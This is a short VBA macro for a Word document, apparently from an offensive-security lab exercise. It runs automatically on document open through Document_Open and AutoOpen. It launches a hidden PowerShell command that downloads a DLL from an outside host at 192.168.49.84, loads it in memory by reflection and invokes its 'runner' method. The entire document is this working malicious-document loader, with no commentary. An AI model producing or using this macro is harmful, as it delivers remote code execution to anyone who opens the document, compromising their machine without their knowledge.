Sub MyMacro()
    Dim str As String
    str = "powershell $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.84/ClassLibrary32.dll');$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType('ClassLibrary32.Class32');$method = $class.GetMethod('runner');$method.Invoke(0, $null)"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
